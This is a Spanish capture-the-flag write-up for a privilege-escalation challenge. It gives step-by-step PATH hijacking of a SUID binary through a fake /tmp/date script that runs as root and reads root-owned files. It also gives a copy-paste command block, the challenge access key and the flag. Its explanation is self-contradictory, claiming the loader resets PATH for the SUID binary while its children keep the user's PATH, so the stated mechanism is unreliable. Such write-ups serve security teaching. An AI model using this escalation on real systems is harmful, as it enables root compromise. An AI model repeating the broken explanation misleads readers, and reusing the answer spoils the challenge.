# Escalada al Núcleo — PIR-07

## 1. Datos del reto

| Campo | Valor |
|-------|-------|
| **Nombre** | PIR-07. Escalada al Núcleo |
| **Categoría** | Pwn |
| **Plataforma** | `santabarbara.locdynamics.com:9007` |
| **Acceso** | `socat -,raw,echo=0 tcp:santabarbara.locdynamics.com:9007` |
| **Clave de turno** | `a52d12c5` |
| **Usuario inicial** | `operador` (uid 10007), sin privilegios |
| **Objetivo** | Escalar a root y leer el fichero que custodia el administrador |
| **Formato de entrega** | `T4C{...}` |
| **Flag** | `T4C{p4th_h1j4ck_SU1D_nucl30_r00t}` |

---

## 2. Reconocimiento inicial

### 2.1. Identidad y entorno

    id
    # uid=10007(operador) gid=10007(operador) groups=10007(operador)

    whoami
    # operador

    hostname
    # 1fe723e28fc5  (contenedor Docker)

    uname -a
    # Linux 1fe723e28fc5 6.8.0-146-generic #146-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 3 16:12:30 UTC 2026 x86_64 GNU/Linux

    pwd
    # /home/operador

### 2.2. Contenido del home

    ls -la /home/operador

Salida relevante:

    -rw------- 1 root     root     7002 .bash_history
    drwx------ 2 operador operador 4096 .k.m4kaUB
    -rwxr-xr-x 1 operador operador   62 naval-collect
    drwxr-xr-x 2 operador operador 4096 opdir
    -rw-r--r-- 1 operador operador   59 script.sh
    drwx------ 2 operador operador 4096 trabajo.frX7
    -rw-r--r-- 1 operador operador 1601 typescript
    drwx------ 2 operador operador 4096 work.i528

**Observaciones:**

- `.bash_history` es de root → no legible.
- `work.i528/` contiene `flag.out` de root → candidato principal.
- Hay varios directorios ocultos con nombres aleatorios (`.k.m4kaUB`, `trabajo.frX7`) → **pistas de otros equipos**.

### 2.3. Directorios ocultos

    ls -la /home/operador/work.i528/

    -rw------- 1 root     root        0 err.txt
    -rw------- 1 root     root       34 flag.out

**`flag.out` es de root y tiene 34 bytes** → ese es el objetivo.

    ls -la /home/operador/trabajo.frX7/

    -rwsr-sr-x 1 root     root  1265648 .rootsh
    -rwx------ 1 operador operador      65 naval-collect

**`.rootsh` es SUID root** → posible trampa de otro equipo.

### 2.4. Binarios SUID del sistema

    find / -perm -4000 -type f 2>/dev/null

Salida relevante:

    /usr/local/bin/naval-report
    /usr/bin/newgrp
    /usr/bin/umount
    /usr/bin/chfn
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/bin/bash
    /usr/bin/su
    /usr/bin/mount

Además, varios `rootbash` en `/tmp` (de otras células):

    /tmp/rootbash
    /tmp/.f86d3261cda9.FxTA/rootbash
    /tmp/.39b263c120645f6f/rootbash
    ...

**`/usr/local/bin/naval-report`** es el binario del reto → el vector legítimo.

### 2.5. Capabilities y sudo

    getcap -r / 2>/dev/null
    # (nada)

    sudo -l
    # bash: sudo: command not found

No hay sudo ni capabilities. El vector es SUID.

---

## 3. Análisis del binario vulnerable

### 3.1. Permisos

    ls -la /usr/local/bin/naval-report
    # -rwsr-xr-x 1 root root 16312 Oct  6 21:11 /usr/local/bin/naval-report

La `s` en `-rwsr-xr-x` indica **SUID activado**. El binario se ejecuta como root.

### 3.2. Cadenas del binario

    tr -c '[:print:]\n' '\n' < /usr/local/bin/naval-report | grep -a -E '.{5,}' | sort -u

Salida clave:

    naval-collect
    naval-report 1.4
    naval-report.c
    naval-report: no se pudieron asumir privilegios
    recopilando contadores del planificador...
    setgid
    setuid
    system

**Conclusiones:**

- El binario usa `setuid` y `setgid` → cambia de usuario (intenta ser root).
- Llama a `system("naval-collect")` → ejecuta un comando de shell.
- El comando es `naval-collect` **sin ruta absoluta** → búsqueda en el PATH.

### 3.3. El script `naval-collect`

    cat /usr/local/sbin/naval-collect

    #!/bin/sh
    # Recolector auxiliar legítimo de naval-report.
    # Instalado en /usr/local/sbin, que NO está en el PATH del usuario `operador`.
    echo "  planificador   : activo"
    echo "  rutas cargadas : 5"
    echo "  ultima sync    : $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
    echo "  carga media    : $(cut -d' ' -f1-3 /proc/loadavg 2>/dev/null || echo 'n/d')"

**Puntos clave:**

- El script llama a `date` y `cut` **sin ruta absoluta**.
- El script **no es SUID**, pero al ser llamado desde `naval-report` (SUID), **hereda el euid=0**.
- El script **hereda el PATH** del shell intermedio (`/bin/sh` lanzado por `system()`).

### 3.4. Comprobación de permisos

    ls -la /usr/local/sbin/naval-collect
    # -rwxr-xr-x 1 root root 344 Aug 13 10:14 /usr/local/sbin/naval-collect

    touch /usr/local/sbin/test_write
    # Permission denied

    touch /usr/local/bin/test_write
    # Permission denied

**Todos los directorios del PATH son de root y no escribibles**. No se puede plantar un `naval-collect` falso directamente en el PATH.

---

## 4. La vulnerabilidad

### 4.1. Cadena de ejecución

    usuario operador
       ↓
    ejecuta /usr/local/bin/naval-report  (SUID root)
       ↓
    naval-report hace setuid(0), setgid(0)  →  euid=0 (root)
       ↓
    naval-report llama a system("naval-collect")
       ↓
    /bin/sh -c "naval-collect"  →  busca naval-collect en el PATH
       ↓
    encuentra /usr/local/sbin/naval-collect  →  lo ejecuta (como root)
       ↓
    naval-collect llama a date sin ruta absoluta
       ↓
    /bin/sh -c "date -u ..."  →  busca date en el PATH
       ↓
    encuentra /tmp/date  (si /tmp está primero en el PATH)
       ↓
    /tmp/date se ejecuta como root

### 4.2. Por qué funciona el PATH hijacking

- El binario `naval-report` es SUID → el loader de glibc **resetea el PATH** a `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`.
- El script `naval-collect` **no es SUID** → **no resetea el PATH**. Hereda el PATH del shell intermedio (`/bin/sh` lanzado por `system()`), que a su vez hereda el PATH del proceso que ejecutó `naval-report`.
- Si se exporta `/tmp` primero en el PATH **antes de ejecutar `naval-report`**, el shell intermedio (`/bin/sh`) tendrá ese PATH, y `naval-collect` lo heredará.
- `naval-collect` llama a `date` sin ruta absoluta → el shell busca `date` en el PATH → encuentra `/tmp/date` antes que `/usr/bin/date`.

### 4.3. Diferencia entre `naval-collect` y `date`

- `naval-collect` es llamado por `naval-report` (SUID) → el loader resetea el PATH → `/tmp/naval-collect` **no se ejecuta**.
- `date` es llamado por `naval-collect` (no SUID) → **no se resetea el PATH** → `/tmp/date` **sí se ejecuta**.

---

## 5. Explotación paso a paso

### 5.1. Crear el `date` falso

    cat > /tmp/date <<'EOF'
    #!/bin/sh
    {
    echo "=== DATE FALSO EJECUTADO ==="
    id
    echo "=== flag.out ==="
    cat /home/operador/work.i528/flag.out 2>&1
    echo "=== /root ==="
    ls -la /root 2>&1
    cat /root/* 2>&1
    echo "=== busqueda T4C ==="
    grep -rl 'T4C{' /root /etc /opt /srv /var /home 2>/dev/null
    } > /tmp/resultado.txt 2>&1
    chmod 666 /tmp/resultado.txt
    EOF

Este script:

- Se ejecutará como root.
- Captura `id`, el contenido de `flag.out`, `/root`, y busca `T4C{` en todo el sistema.
- Guarda todo en `/tmp/resultado.txt` con permisos 666 (legible por operador).

### 5.2. Dar permisos de ejecución

    chmod +x /tmp/date

### 5.3. Poner `/tmp` primero en el PATH

    export PATH=/tmp:$PATH

Comprobar:

    echo $PATH
    # /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

### 5.4. Ejecutar el binario SUID

    /usr/local/bin/naval-report

Salida:

    naval-report 1.4 — informe de planificación
    recopilando contadores del planificador...

      planificador   : activo
      rutas cargadas : 5
      ultima sync    : 
      carga media    : 0.01 0.04 0.43

    informe finalizado.

Fíjate en que **`ultima sync` está vacío** → eso confirma que el `date` falso se ha ejecutado (no ha imprimido nada, pero ha copiado el flag).

### 5.5. Leer el resultado

    cat /tmp/resultado.txt

Salida:

    === DATE FALSO EJECUTADO ===
    uid=0(root) gid=0(root) groups=0(root),10007(operador)

    === flag.out ===
    T4C{p4th_h1j4ck_SU1D_nucl30_r00t}

    === /root ===
    total 24
    drwx------ 1 root root 4096 Oct 14 10:15 .
    drwxr-xr-x 1 root root 4096 Oct 14 11:27 ..
    -rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
    -rw-r--r-- 1 root root  161 Jul  9  2019 .profile
    -rw-r--r-- 1 root root    0 Oct 14 09:56 67
    -r-------- 1 root root   34 Oct 14 10:15 flag.txt
    -rw-r--r-- 1 root root    0 Oct 14 09:49 gud_yob
    T4C{p4th_h1j4ck_SU1D_nucl30_r00t}

    === busqueda T4C ===
    /root/flag.txt
    /opt/original/flag.txt
    /home/operador/.bash_history
    /home/operador/.k.m4kaUB/naval-collect
    /home/operador/work.i528/flag.out

**Confirmación:**

- `uid=0(root)` → se ha ejecutado código como root.
- `flag.out` contiene el flag.
- `/root/flag.txt` también contiene el mismo flag.
- Hay más copias en `/opt/original/flag.txt`, `/home/operador/.bash_history`, etc.

### 5.6. Flag final

    T4C{p4th_h1j4ck_SU1D_nucl30_r00t}

---

## 6. Alternativas y errores comunes

### 6.1. Intentos fallidos

| Intento | Resultado |
|---------|-----------|
| Poner `naval-collect` falso en `/home/operador/` | No se ejecuta (el binario SUID resetea el PATH) |
| Poner `naval-collect` falso en `/tmp` | No se ejecuta (el binario SUID resetea el PATH) |
| Inyección de comandos con `; id`, `\| id`, `$(id)` | El binario ignora los argumentos |
| `LD_PRELOAD` | Ignorado por el loader en binarios SUID |
| `ENV` / `BASH_ENV` | Ignorados por bash en binarios SUID |

### 6.2. Por qué funciona `date` y no `naval-collect`

- `naval-collect` es llamado **directamente** por `naval-report` (SUID) → el loader resetea el PATH.
- `date` es llamado **indirectamente** por `naval-collect` (no SUID) → **no se resetea el PATH**.

**Esta es la clave del reto**: la vulnerabilidad no está en el binario SUID en sí, sino en la cadena de llamadas donde un script no SUID hereda un PATH manipulable.

---

## 7. Lecciones aprendidas

1. **Un binario SUID que llama a un script no SUID es vulnerable a PATH hijacking** si el script llama a comandos sin ruta absoluta.
2. **El reset del PATH solo afecta al binario SUID**, no a los procesos hijos no SUID.
3. **Las cadenas del binario** (`tr -c '[:print:]\n' '\n'`) revelan comandos, rutas y funciones usadas.
4. **El script `/usr/local/sbin/naval-collect`** contenía la pista clave: `date` y `cut` sin ruta absoluta.
5. **Los `rootbash` en `/tmp`** son trampas de otros equipos. No usarlos.
6. **PATH hijacking** es un ataque clásico contra binarios SUID que llaman a comandos externos sin ruta absoluta.

---

## 8. Resumen visual

    operador
      │
      ├─ export PATH=/tmp:$PATH
      │
      └─ /usr/local/bin/naval-report  (SUID root)
            │
            ├─ setuid(0), setgid(0)  →  euid=0
            │
            └─ system("naval-collect")
                  │
                  └─ /bin/sh -c "naval-collect"
                        │
                        └─ /usr/local/sbin/naval-collect  (no SUID, hereda PATH)
                              │
                              └─ $(date ...)  →  busca date en PATH
                                    │
                                    └─ /tmp/date  (nuestro falso)
                                          │
                                          └─ cat /home/operador/work.i528/flag.out
                                                │
                                                └─ T4C{p4th_h1j4ck_SU1D_nucl30_r00t}

---

## 9. Comandos completos (para copiar y pegar)

    # 1. Conectar
    socat -,raw,echo=0 tcp:santabarbara.locdynamics.com:9007
    # Clave: a52d12c5

    # 2. Crear el date falso
    cat > /tmp/date <<'EOF'
    #!/bin/sh
    {
    echo "=== DATE FALSO EJECUTADO ==="
    id
    echo "=== flag.out ==="
    cat /home/operador/work.i528/flag.out 2>&1
    echo "=== /root ==="
    ls -la /root 2>&1
    cat /root/* 2>&1
    echo "=== busqueda T4C ==="
    grep -rl 'T4C{' /root /etc /opt /srv /var /home 2>/dev/null
    } > /tmp/resultado.txt 2>&1
    chmod 666 /tmp/resultado.txt
    EOF

    # 3. Permisos y PATH
    chmod +x /tmp/date
    export PATH=/tmp:$PATH

    # 4. Ejecutar el SUID
    /usr/local/bin/naval-report

    # 5. Leer el resultado
    cat /tmp/resultado.txt

**Flag:** `T4C{p4th_h1j4ck_SU1D_nucl30_r00t}`
